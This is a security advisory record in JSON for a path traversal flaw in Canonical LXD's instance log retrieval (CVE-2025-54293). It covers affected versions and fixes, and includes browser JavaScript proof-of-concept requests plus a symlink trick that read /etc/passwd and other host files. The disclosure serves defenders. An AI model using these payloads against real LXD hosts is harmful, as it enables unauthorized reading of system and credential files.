{
  "id": "GHSA-472f-vmf2-pr3h",
  "modified": "2025-10-02T21:27:22.108244Z",
  "published": "2025-10-02T21:15:53Z",
  "aliases": [
    "CVE-2025-54293"
  ],
  "summary": "Canonical LXD Path Traversal Vulnerability in Instance Log File Retrieval Function",
  "details": "### Impact\nAlthough outside the scope of this penetration test, a path traversal vulnerability exists in the validLogFileName function that validates log file names in lxd/instance_logs.go in the LXD 5.0 LTS series.\n\nThis vulnerability was fixed in PR #15022 in February 2025, and is fixed in at least LXD 5.21 and later. However, this PR appears to be primarily aimed at code improvement rather than vulnerability fixing, with the vulnerability being fixed as a side effect. Therefore, no CVE number has been issued, and no security patch has been made for LXD 5.0 and earlier. \n\nHowever, since LXD 5.0 LTS is still in its support period and installation procedures are explained in official documentation, we judge that environments affected by this vulnerability likely exist and report it.\n\nImplementation in vulnerable versions (LXD 5.0 LTS series):\n\nhttps://github.com/canonical/lxd/blob/1f8c9f77782784900960bb3b8577c1491db59277/lxd/instance_logs.go#L152-L163\n\nThis function allows filenames starting with snapshot_ or migration_, but lacks sufficient validation for the portion after the prefix, enabling path traversal attacks. The fixed version is as follows:\n\nImplementation in fixed versions (LXD 5.21 and later):\n\nhttps://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L665-L679\n\nhttps://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/shared/util.go#L833-L835\n\nThis function ensures that filenames do not contain /, \\, or .. .\n\nNote that in Linux generally, path traversal like /not_exist_folder/../exist_folder/ is rejected within system calls and doesn't\nsucceed. \n\nHowever, in this case, the attack succeeds because URL normalization by golang's filepath.Join is performed beforehand.\n\nRelated part of instanceLogGet function:\n\nhttps://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L218-L269\n\nRelated part of instanceLogDelete function:\n\nhttps://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L331-L347\n\nIn the fixed version, filenames containing path traversal strings are rejected at the validLogFileName stage through pre-checking by shared.IsFileName.\n\n### Reproduction Steps\n\nAll reproduction steps for this finding must be performed on LXD 5.0.\n\n1. Log in with an account having access to LXD-UI\n2. Open browser DevTools and execute the following JavaScript to attempt path traversal\nattack:\n\n```js\n(async () =\u003e {\nconst projectName = prompt(\"Enter target project name:\");\nconst instanceName = prompt(\"Enter target instance\nname:\");\nconst maliciousLogFile =\nencodeURIComponent('snapshot_../../../../../../../../../../etc\n/passwd');\nconst response = await\nfetch(`/1.0/instances/${instanceName}/logs/${maliciousLogFile}\n?project=${projectName}`, {\nmethod: 'GET',\ncredentials: 'include'\n});\nconst content = await response.text();\nconsole.log(content);\n})();\n```\n\n### Description (2)\nA similar issue also exists in the validExecOutputFileName function:\n\nhttps://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L681-L688\n\nFor exec-output, since a suffix is specified, it appears that arbitrary files cannot be specified.\nHowever, if an attacker has command execution privileges within a container, they can create a symbolic link that satisfies the suffix condition within the container and have the LXD host access it to perform the attack.\n\n### Reproduction Steps (2)\n\n1. Open terminal in instance using LXD-UI and create symbolic link:\n\n```\nln -s /etc/passwd exec_XXX-symlink.stdout\n```\n\n2. Execute the following JavaScript in browser DevTools to read files via symbolic link:\n\n```js\n(async () =\u003e {\nconst projectName = prompt(\"Enter target project name:\");\nconst instanceName = prompt(\"Enter target instance\nname:\");\nconst maliciousExecFile =\nencodeURIComponent(`exec_../../../../../../../../../../../var/\nsnap/lxd/common/lxd/storage-pools/${projectName}/containers/${\ninstanceName}/rootfs/root/exec_XXX-symlink.stdout`);\nconst response = await\nfetch(`/1.0/instances/${instanceName}/logs/exec-output/${malic\niousExecFile}?project=${projectName}`, {\nmethod: 'GET',\ncredentials: 'include'\n});\nconst content = await response.text();\nconsole.log(content);\n})();\n```\n\nThis technique allows attackers with command execution privileges within a container to create symbolic links and attempt access to the host filesystem.\n\n### Risk\nThis vulnerability exists in the LXD 5.0 LTS series, which appears to remain in widespread use, and if attackers have access to arbitrary projects and instances, they can read arbitrary files on the LXD host. \n\nThis could lead to leakage of the following information:\n-​ LXD host configuration files (/etc/passwd, /etc/shadow, etc.)\n-​ LXD database files (containing information about all projects and instances)\n-​ Configuration files and data of other instances\n-​ Sensitive information on the host system\n\n### Countermeasures\nSince this vulnerability has already been fixed, the primary countermeasures are providing information to users running older versions of LXD and, if possible, backporting to other LTS versions:\n\n### Patches\n\n| LXD Series  | Status |\n| ------------- | ------------- |\n| 6 | Fixed in LXD 6.5  |\n| 5.21 | Fixed in LXD 5.21.4  |\n| 5.0 | Ignored - Not critical |\n| 4.0  | Ignored - Not critical  |\n\n### References\nReported by GMO Flatt Security Inc.",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/canonical/lxd",
        "purl": "pkg:golang/github.com/canonical/lxd"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "4.0"
            },
            {
              "fixed": "5.21.4"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-472f-vmf2-pr3h/GHSA-472f-vmf2-pr3h.json"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/canonical/lxd",
        "purl": "pkg:golang/github.com/canonical/lxd"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "6.0"
            },
            {
              "fixed": "6.5"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-472f-vmf2-pr3h/GHSA-472f-vmf2-pr3h.json"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/canonical/lxd",
        "purl": "pkg:golang/github.com/canonical/lxd"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0.0.0-20200331193331-03aab09f5b5c"
            },
            {
              "fixed": "0.0.0-20250224180022-ec09b24179f3"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-472f-vmf2-pr3h/GHSA-472f-vmf2-pr3h.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/canonical/lxd/security/advisories/GHSA-472f-vmf2-pr3h"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54293"
    },
    {
      "type": "WEB",
      "url": "https://github.com/canonical/lxd/pull/15022"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/canonical/lxd"
    }
  ]
}